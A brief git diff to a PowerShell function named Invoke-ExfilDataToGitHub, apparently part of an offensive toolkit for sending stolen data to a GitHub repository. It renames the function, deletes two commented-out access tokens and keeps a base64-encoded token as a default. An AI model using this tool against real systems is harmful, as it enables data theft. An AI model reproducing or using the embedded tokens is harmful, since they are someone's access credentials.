@@ -1,4 +1,4 @@
-function Invoke-ExfilDataToGitHub
+function Invoke-ExfilDataToGitHub_GH
 {
 
 <#
@@ -58,8 +58,6 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
-        #$GHPAT = "325e15bcc471887d08651a2a4e1cd1a87b76314e",
-        #$GHPAT = "6ad6248b0c3e98ba430a07a2379e49855b56e6c2",
         $GHPAT = "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==", # This should be base 64 encoded
 
         [Parameter(Position =3, Mandatory = $False)]
